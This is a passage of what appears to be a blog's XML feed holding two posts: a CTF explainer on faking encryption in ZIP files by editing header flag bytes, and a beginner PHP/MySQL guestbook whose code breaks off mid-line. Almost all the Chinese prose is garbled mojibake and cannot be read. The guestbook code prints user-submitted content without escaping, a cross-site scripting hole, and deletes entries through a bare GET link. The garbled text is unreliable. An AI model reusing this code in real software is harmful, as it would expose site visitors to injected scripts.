      <content type="html"><![CDATA[<p>çº¯ç²¹å¤ä¹ ä¸€ä¸‹ä¼ªåŠ å¯†</p><a id="more"></a><h2 id="åŸç†"><a name="t1"></a>åŸç†</h2><hr><p>zipä¼ªåŠ å¯†æ˜¯åœ¨æ–‡ä»¶å¤´çš„åŠ å¯†æ ‡å¿—ä½åšä¿®æ”¹ï¼Œè¿›è€Œå†æ‰“å¼€æ–‡ä»¶æ—¶è¯†è¢«åˆ«ä¸ºåŠ å¯†å‹ç¼©åŒ…ã€‚</p><h2 id="èƒŒæ™¯"><a name="t2"></a>èƒŒæ™¯</h2><hr><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥çœ‹zipæ–‡ä»¶å¤´åè®®ã€‚è¿™é‡Œä»¥ä¸­æ–‡èµ„æ–™ä¸ºè¯ï¼Œä½†æ˜¯ä»ç„¶å»ºè®®å¤§å®¶å»<a href="https://www.pkware.com" target="_blank">http://www.pkware.com</a>  é˜…è¯»å®˜æ–¹æ–‡æ¡£ï¼Œè™½ç„¶è‹±æ–‡è¯»èµ·æ¥æœ‰äº›å›°éš¾ã€‚</p><blockquote><br>  <p><strong>ä¸€ä¸ª ZIP æ–‡ä»¶ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š</strong>  </p><br><br>  <p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿— <br><br>    <a href="https://blog.csdn.net/wclxyn/article/details/7288994" target="_blank">æŸ¥çœ‹è¯¦æƒ…</a></p><br></blockquote><h2 id="å®ä¾‹"><a name="t3"></a>å®ä¾‹</h2><p>ä¸‹é¢ç»™å‡ºè¥¿æ™®çš„ä¸€ä¸ªå®ä¾‹ï¼š <br><br><img src="https://s1.ax1x.com/2018/05/20/CggXmd.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°" title=""> <br><br><strong>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š</strong>  <br><br>50 4B 03 04ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®°ï¼ˆ0x04034b50ï¼‰ <br><br>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬  <br><br>00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼‰  <br><br>08 00ï¼šå‹ç¼©æ–¹å¼  <br><br>5A 7Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´  <br><br>F7 46ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ  <br><br>16 B5 80 14ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰ <br><br>19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰ <br><br>17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰ <br><br>07 00ï¼šæ–‡ä»¶åé•¿åº¦  <br><br>00 00ï¼šæ‰©å±•è®°å½•é•¿åº¦  <br><br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 <br><br><strong>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š</strong>  <br><br>50 4B 01 02ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°(0x02014b50) <br><br>3F 00ï¼šå‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬  <br><br>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬  <br><br>00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œè¿™ä¸ªæ›´æ”¹è¿™é‡Œè¿›è¡Œä¼ªåŠ å¯†ï¼Œæ”¹ä¸º09 00æ‰“å¼€å°±ä¼šæç¤ºæœ‰å¯†ç äº†ï¼‰  <br><br>08 00ï¼šå‹ç¼©æ–¹å¼  <br><br>5A 7Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´  <br><br>F7 46ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ  <br><br>16 B5 80 14ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰ <br><br>19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰ <br><br>17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰ <br><br>07 00ï¼šæ–‡ä»¶åé•¿åº¦  <br><br>24 00ï¼šæ‰©å±•å­—æ®µé•¿åº¦  <br><br>00 00ï¼šæ–‡ä»¶æ³¨é‡Šé•¿åº¦  <br><br>00 00ï¼šç£ç›˜å¼€å§‹å·  <br><br>00 00ï¼šå†…éƒ¨æ–‡ä»¶å±æ€§  <br><br>20 00 00 00ï¼šå¤–éƒ¨æ–‡ä»¶å±æ€§  <br><br>00 00 00 00ï¼šå±€éƒ¨å¤´éƒ¨åç§»é‡  <br><br>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 <br><br><strong>å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š</strong>  <br><br>50 4B 05 06ï¼šç›®å½•ç»“æŸæ ‡è®°  <br><br>00 00ï¼šå½“å‰ç£ç›˜ç¼–å·  <br><br>00 00ï¼šç›®å½•åŒºå¼€å§‹ç£ç›˜ç¼–å·  <br><br>01 00ï¼šæœ¬ç£ç›˜ä¸Šçºªå½•æ€»æ•°  <br><br>01 00ï¼šç›®å½•åŒºä¸­çºªå½•æ€»æ•°  <br><br>59 00 00 00ï¼šç›®å½•åŒºå°ºå¯¸å¤§å°  <br><br>3E 00 00 00ï¼šç›®å½•åŒºå¯¹ç¬¬ä¸€å¼ ç£ç›˜çš„åç§»é‡  <br><br>00 00ï¼šZIP æ–‡ä»¶æ³¨é‡Šé•¿åº¦</p><h2 id="çŒœæƒ³"><a name="t4"></a>çŒœæƒ³</h2><hr><p>æ‰€ä»¥å¦‚æœæŠŠä¸€ä¸ªzipæ–‡ä»¶çš„æ–‡ä»¶å¤´æˆ–è€…åŠ å¯†æ ‡å¿—ä½è¿›è¡Œé€‚å½“ä¿®æ”¹ï¼Œé‚£å°±å¯èƒ½ä¼šæ”¹å˜æ–‡ä»¶çš„å¯è¯»æ€§äº†å‘—ï¼</p><h2 id="æµ‹è¯•ä¸€"><a name="t5"></a>æµ‹è¯•ï¼ˆä¸€ï¼‰</h2><hr><p>äº²æµ‹ä¾‹å­ï¼šå…ˆå‹ç¼©ä¸€ä¸ª1.zipï¼Œå†ç”¨Winhexæ‰“å¼€ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://s1.ax1x.com/2018/05/20/CggvTI.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°" title=""></p><p><strong>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š</strong> <br><br>50 4B 03 04ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®° <br><br>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬  <br><br>00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼‰ <br><br>08 00ï¼šå‹ç¼©æ–¹å¼  <br><br>07 76ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´  <br><br>F2 48ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ  <br><br>â€¦â€¦ <br><br><strong>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š</strong>  <br><br>50 4B 01 02ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°(0x02014b50) <br><br>1F 00ï¼šå‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬  <br><br>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬  <br><br>00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œè¿™ä¸ªæ›´æ”¹è¿™é‡Œè¿›è¡Œä¼ªåŠ å¯†ï¼Œæ”¹ä¸º09 00æ‰“å¼€å°±ä¼šæç¤ºæœ‰å¯†ç äº†ï¼‰  <br><br>08 00ï¼šå‹ç¼©æ–¹å¼ <br><br>07 76ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´  <br><br>F2 48ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ <br><br>â€¦â€¦</p><blockquote><br>  <p>ç»¼ä¸Šæ‰€è¿°ï¼Œå¦‚æœæŠŠç¬¬äºŒä¸ªåŠ å¯†æ ‡è®°ä½çš„00 00æ”¹ä¸º09 00ï¼Œæ‰“å¼€å°±ä¼šæç¤ºæœ‰å¯†ç ï¼š <br><br>  <img src="https://s1.ax1x.com/2018/05/20/Cggzkt.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°" title=""> <br><br>  <img src="https://s1.ax1x.com/2018/05/20/Cg2P1S.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°" title=""></p><br></blockquote><p>äºæ˜¯ä¹ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†zipä¼ªåŠ å¯†çš„ç›®çš„ï¼Œå¯æ˜¯è¿™é‡Œåˆæœ‰ä¸€ä¸ªç–‘é—®äº†ï¼Œä½ å¯èƒ½ä¼šé—®ï¼Œä¸ºä»€ä¹ˆæ”¹æˆ09ï¼Œè€Œä¸æ˜¯å…¶ä»–çš„æ•°å­—å‘¢ï¼Œå…¶å®æ”¹æˆ09åªæ˜¯ä¸¾çš„ä¸€ä¸ªä¾‹å­ï¼Œåªè¦æœ«ä½æ˜¯å¥‡æ•°ï¼Œå°±ä»£è¡¨åŠ å¯†ï¼Œåä¹‹ï¼Œæœ«ä½æ˜¯å¶æ•°ä»£è¡¨æœªåŠ å¯†ï¼ˆè¿™æ˜¯æˆ‘çŒœæƒ³çš„ï¼Œå…·ä½“æ“ä½œä¹Ÿç¬¦åˆæˆ‘çš„çŒœæƒ³ï¼Œå¯æˆ‘ä¸çŸ¥é“è¿™ä¸ªåŸç†æ˜¯ä»€ä¹ˆï¼Œå¦‚æœä½ äº†è§£çš„è¯ï¼Œæ¬¢è¿æ¥åˆ†äº«åˆ†äº«~^_^ï¼‰</p><h2 id="æµ‹è¯•äºŒ"><a name="t6"></a>æµ‹è¯•ï¼ˆäºŒï¼‰</h2><hr><p><strong>çŒœæƒ³ï¼š</strong></p><p>æ—¢ç„¶åŠ å¯†æ ‡å¿—ä½å¯ä»¥ä¿®æ”¹ï¼Œé‚£å¤´æ–‡ä»¶æ ‡è®°ä½åº”è¯¥ä¹Ÿèƒ½ä¿®æ”¹å§ï¼Œè¯•è¯•å’¯~ï¼š</p><p><img src="https://s1.ax1x.com/2018/05/20/Cg2E0s.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°" title=""></p><p>æŠŠæ–‡æœ¬åŒºåŸæ¥æ˜¾ç¤ºçš„PKä½çš„50 4Bæ”¹æˆå…¶ä»–æ•°æ®ï¼Œå†æ‰“å¼€zipæ–‡ä»¶ï¼š</p><p><img src="https://s1.ax1x.com/2018/05/20/Cg2V7n.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°" title=""> <br><br>æ˜¾ç„¶ï¼Œè¿™æ ·ä¹Ÿä½¿zipæ–‡ä»¶ä¸å¯è¯»ï¼</p><h2 id="è¯†åˆ«çœŸå‡åŠ å¯†"><a name="t4"></a>è¯†åˆ«çœŸå‡åŠ å¯†</h2><h3 id="æ— åŠ å¯†"><a name="t5"></a>æ— åŠ å¯†</h3><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€åŠ å¯†åº”å½“ä¸º<code>00 00</code> <br><br>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°åº”å½“ä¸º<code>00 00</code></p><h3 id="å‡åŠ å¯†"><a name="t6"></a>å‡åŠ å¯†</h3><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€åŠ å¯†åº”å½“ä¸º<code>00 00</code> <br><br>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°åº”å½“ä¸º<code>09 00</code></p><h3 id="çœŸåŠ å¯†"><a name="t7"></a>çœŸåŠ å¯†</h3><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€åŠ å¯†åº”å½“ä¸º<code>09 00</code> <br><br>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°åº”å½“ä¸º<code>09 00</code> <br><br><img src="https://s1.ax1x.com/2018/05/20/Cg2FXQ.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°" title=""></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php+mysqlç•™è¨€æ¿å®ç°ä»£ç åˆ†äº«</title>
      <link href="/php-mysql-content.html"/>
      <url>/php-mysql-content.html</url>
      <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>  ä»Šå¤©æ²¡ä»€ä¹ˆæƒ³è¯´çš„ï¼Œç›´æ¥ä¸Šæ­£æ–‡å§ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><a id="more"></a><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><p>  åœ¨å‰å‡ å¤©å­¦ä¹ çš„åŸºç¡€ä¸Šï¼Œè‡ªå·±é‡æ–°æŠŠåŠŸèƒ½å®ç°ä¸€éï¼Œå¹¶æŠŠè‡ªå·±çš„æ€»ç»“éƒ½å†™åœ¨ä»£ç çš„æ³¨é‡Šé‡Œé¢ã€‚ã€‚ã€‚</p><h3 id="ä¸Šæ¬¡å¿˜äº†çš„sql-PHPçš„æŸ¥è¯¢æ€»ç»“"><a href="#ä¸Šæ¬¡å¿˜äº†çš„sql-PHPçš„æŸ¥è¯¢æ€»ç»“" class="headerlink" title="ä¸Šæ¬¡å¿˜äº†çš„sql+PHPçš„æŸ¥è¯¢æ€»ç»“"></a>ä¸Šæ¬¡å¿˜äº†çš„sql+PHPçš„æŸ¥è¯¢æ€»ç»“</h3><p> mysqliæŸ¥è¯¢ç»“æœï¼š<br>1.ç”¨å®ƒçš„mysqli_resultç±»ï¼Œæ–‡æ¡£æ˜¯è¿™æ ·è¯´çš„ â€œä»£è¡¨ä»ä¸€ä¸ªæ•°æ®åº“æŸ¥è¯¢ä¸­è·å–çš„ç»“æœé›†â€ ã€‚ã€‚ã€‚<br>queryè¯­å¥æ‰§è¡Œå®Œä»¥åä¸€èˆ¬æ˜¯è¿”å›<code>true</code>è·Ÿ<code>false</code>ï¼Œä½†å¦‚æœæ‰§è¡Œçš„æ˜¯selectè¯­å¥çš„è¯ï¼Œè¿”å›çš„å°±æ˜¯ä¸€ä¸ªå¯¹è±¡äº†ï¼Œä½†æ˜¯æ‰§è¡Œä¸æˆåŠŸè‚¯å®šæ˜¯<code>false</code>ï¼Œæ‰€ä»¥ä¸€èˆ¬å‰é¢è¦å…ˆåˆ¤æ–­ã€‚ã€‚</p><p>2.å¦‚æœä»–æ˜¯å¯¹è±¡çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥è°ƒç”¨<code>mysqli_result</code>ç±»ä¸‹çš„<code>fetch_array()</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ä¸å¯é€†çš„ï¼Œå°±æ˜¯æ˜¾ç¤ºå®Œä»¥åé‡å¤åŠ è½½è¯¥å‡½æ•°æ²¡ç”¨ï¼Œè¦è§£å†³çš„è¿™ç§æƒ…å†µæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªæ•°ç»„å­˜å‚¨ä¸€ä¸‹ã€‚ã€‚ã€‚<br>  å¦‚æœé‡Œé¢ä»€ä¹ˆéƒ½ä¸å¡«çš„è¯ä»–è¿”å›çš„æ•°ç»„é‡Œé¢å³å«æœ‰ç´¢å¼•ï¼Œåˆå«æœ‰å­—æ®µï¼Œè¯¦ç»†å¯ä»¥è‡ªå·±ç”¨<code>var_dump</code>å‡½æ•°æµ‹è¯•ä¸€ä¸‹ã€‚ã€‚ã€‚<br>æ‰€ä»¥å¯ä»¥ç”¨ä¸€ä¸ªå¸¸é‡<code>MYSQLI_ASSOC</code>ï¼Œæ³¨æ„å¸¸é‡ä¸éœ€è¦å¼•å·ï¼Œä¹Ÿä¸éœ€è¦<code>$</code>ç¬¦</p><h3 id="ç™»å½•åŠŸèƒ½"><a href="#ç™»å½•åŠŸèƒ½" class="headerlink" title="ç™»å½•åŠŸèƒ½"></a>ç™»å½•åŠŸèƒ½</h3><p> ç”±äºhttpæ˜¯æ— è®°å¿†çš„ï¼Œå…³é—­ç½‘é¡µåä¼šæ¶ˆå¤±æ•°æ®ï¼Œå› æ­¤æ‰è¦ç”¨æ•°æ®åº“å»å­˜å‚¨æ•°æ®<br> æ‰€ä»¥æˆ‘ä»¬ç”¨sessionè·Ÿcookieæ¥å®ç°ç™»å½•åŠŸèƒ½ï¼Œæˆ‘ç”¨çš„æ˜¯sessionï¼Œå› ä¸ºsessionä¸€èˆ¬éƒ½åœ¨æœåŠ¡å™¨ç«¯ï¼Œæ¯”è¾ƒå®‰å…¨</p><h3 id="è¿˜æœ‰å‡ ç‚¹æ³¨æ„äº‹é¡¹"><a href="#è¿˜æœ‰å‡ ç‚¹æ³¨æ„äº‹é¡¹" class="headerlink" title="è¿˜æœ‰å‡ ç‚¹æ³¨æ„äº‹é¡¹"></a>è¿˜æœ‰å‡ ç‚¹æ³¨æ„äº‹é¡¹</h3><p>1.Undefined index:çš„é”™è¯¯ï¼Œè¿™ç§é”™è¯¯æˆ‘å‡ºç°äº†å¾ˆå¤šæ¬¡ï¼Œä¸»è¦æ˜¯postæˆ–è€…getè¯·æ±‚ä¸ºç©ºå¯¼è‡´çš„ï¼Œåæ¥æ˜¯åœ¨classç±»é‡Œé¢è°ƒç”¨äº†issetå‡½æ•°è§£å†³çš„â€¦..</p><p>2.ä»£ç ä¸­æ‰€æœ‰æ³¨é‡Šä¸­çš„var_dumpå‡½æ•°éƒ½æ˜¯ç”¨åšæµ‹è¯•</p><p>3.è¿˜æœ‰å°±æ˜¯htmlè¯­å¥è·ŸPHPè¯­å¥çš„æ··å†™ä¸€å®šè¦å°å¿ƒï¼Œå¾ˆå®¹æ˜“å°±ä¼šå†™é”™</p><p>4.æˆ‘ç”¨çš„æ˜¯PHPstudyæ­å»ºçš„ç¯å¢ƒï¼Œæ•°æ®åº“èµ·åPHP10</p><h3 id="ä¸‹é¢å°±é™„ä¸Šä»£ç "><a href="#ä¸‹é¢å°±é™„ä¸Šä»£ç " class="headerlink" title="ä¸‹é¢å°±é™„ä¸Šä»£ç "></a>ä¸‹é¢å°±é™„ä¸Šä»£ç </h3><p>1.book.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç•™è¨€æ¿é¦–é¡µ</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> (<span class="string">'connect.php'</span>);</span><br><span class="line">    <span class="keyword">include</span> (<span class="string">'mysql.php'</span>);</span><br><span class="line">    <span class="comment">//var_dump($_SESSION);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> date_default_timezone_set(<span class="string">"PRC"</span>);  <span class="comment">//è¿™å¥è¯è§£å†³çš„æ˜¯It is not safe to rely on the system's timezone settingsæŠ¥é”™ </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;ç•™è¨€æ¿&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.wrap &#123;</span><br><span class="line">              width:<span class="number">800</span>px; </span><br><span class="line">              margin:<span class="number">0</span>px auto;</span><br><span class="line">              </span><br><span class="line">         &#125;</span><br><span class="line">   .add &#123;overflow: hidden;&#125;</span><br><span class="line">   .add .content &#123;</span><br><span class="line">                  width: <span class="number">798</span>px;</span><br><span class="line">                  margin: :<span class="number">0</span>;</span><br><span class="line">                  padding: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    .add .user&#123;float: left;&#125;</span><br><span class="line">    .add .btn&#123;float: right;&#125;</span><br><span class="line">    .msg&#123; margin:<span class="number">20</span>px <span class="number">0</span>px;background: <span class="comment">#ccc; padding:5px;&#125;</span></span><br><span class="line">    .msg .info&#123;overflow: hidden;&#125;</span><br><span class="line">    .msg .user&#123;float: left;color:blue;&#125;</span><br><span class="line">    .msg .time&#123;float:right;color:<span class="comment">#999;&#125;</span></span><br><span class="line">    .msg .content&#123;width:<span class="number">100</span>%padding:<span class="number">5</span>px;&#125;</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;div class="wrap"&gt;</span><br><span class="line">    &lt;!-- å‘è¡¨ç•™è¨€ --&gt;</span><br><span class="line">    &lt;div class="add"&gt;</span><br><span class="line">    &lt;form action=<span class="string">'save.php'</span> method=<span class="string">'post'</span> &gt;</span><br><span class="line">    &lt;textarea  class="content" name='content' cols="50" rows="5"&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;input class="user" type="text"  name='user' /&gt;</span><br><span class="line">    &lt;input class="btn" type="submit" value="å‘è¡¨ç•™è¨€"/&gt;</span><br><span class="line">    &lt;a <span class="class"><span class="keyword">class</span>='<span class="title">btn</span>' <span class="title">href</span>='<span class="title">login</span>.<span class="title">php</span>'&gt;ç™»å½•&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line">    foreach ($d as $row ) &#123;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;!--æŸ¥çœ‹ç•™è¨€ --&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>='<span class="title">msg</span>'&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>='<span class="title">info</span>'&gt;</span></span><br><span class="line">    &lt;span class='user'&gt;&lt;?php echo $row['user'] ;?&gt;&lt;/span&gt;</span><br><span class="line">    &lt;span class ='time'&gt;&lt;?php echo date("Y-m-d H:i:s",$row['intime']);?&gt;  &lt;!--ç”¨äº†dateå‡½æ•°æ”¹å˜ä¸€ä¸‹æ ¼å¼--&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) == <span class="keyword">true</span>) &#123;<span class="meta">?&gt;</span></span><br><span class="line">    &lt;a onclick=<span class="string">"return confirm('ä½ ç¡®å®šè¦åˆ é™¤å—ï¼Ÿ')"</span> href=<span class="string">"delete.php?id=&lt;?php echo $row['id'];?&gt;"</span>&gt;åˆ é™¤&lt;/a&gt;&lt;/span&gt;   </span><br><span class="line">    &lt;!--è¿™é‡Œç”¨onclickå»å†™js--&gt;    </span><br><span class="line">    <span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>='<span class="title">content</span>'&gt;</span></span><br><span class="line">      &lt;?php echo $row['content'] ;?&gt;</span><br><span class="line">       &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;    </span><br><span class="line">         <span class="meta">&lt;?php</span> </span><br><span class="line">     &#125;</span><br><span class="line">         <span class="meta">?&gt;</span>       </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>2.save.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">æ­¤å¤„æ˜¯å®Œæˆç•™è¨€æ¿çš„å¢åŠ ç•™è¨€çš„åŠŸèƒ½</span></span><br><span class="line"><span class="comment">æ— è®ºä½ æ˜¯å¦æ˜¯ç®¡ç†å‘˜éƒ½å¯ä»¥å‘è¡¨ç•™è¨€</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> (<span class="string">'connect.php'</span>);</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">'test3.php'</span>);</span><br><span class="line">  $n = <span class="keyword">new</span> input();</span><br><span class="line">  $flag = $n-&gt;post(<span class="string">'content'</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>($flag === <span class="keyword">false</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"è¾“å…¥å†…å®¹ä¸èƒ½ä¸ºç©ºï¼ï¼"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   $content = $flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  $flag = $n-&gt;post(<span class="string">'user'</span>);</span><br><span class="line">  <span class="keyword">if</span>( $flag == <span class="keyword">false</span> )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span 